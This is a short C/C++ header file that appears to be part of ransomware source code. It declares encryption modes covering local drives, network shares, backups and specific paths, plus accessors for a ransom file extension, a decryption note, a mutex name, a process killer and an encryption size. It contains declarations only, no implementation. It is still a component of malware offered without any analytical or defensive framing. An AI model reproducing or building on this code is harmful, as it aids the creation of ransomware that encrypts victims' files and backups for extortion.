#pragma once
#include "../common.h"

enum EncryptModes {

	ALL_ENCRYPT = 10,
	LOCAL_ENCRYPT = 11,
	NETWORK_ENCRYPT = 12,
	BACKUPS_ENCRYPT = 13,
	PATH_ENCRYPT = 14

};


namespace global {

	PWCHAR GetExtention();
	PCHAR GetDecryptNote();
	PCHAR GetMutexName();
	VOID SetEncryptMode(INT EncryptMode);
	INT GetEncryptMode();
	VOID SetProcKiller(BOOL IsEnabled);
	BOOL GetProcKiller();
	VOID SetEncryptPath(LPCWSTR Path);
	LPCWSTR GetEncryptPath();
	BOOL SetEncryptSize(INT Size);
	BYTE GetEncryptSize();

}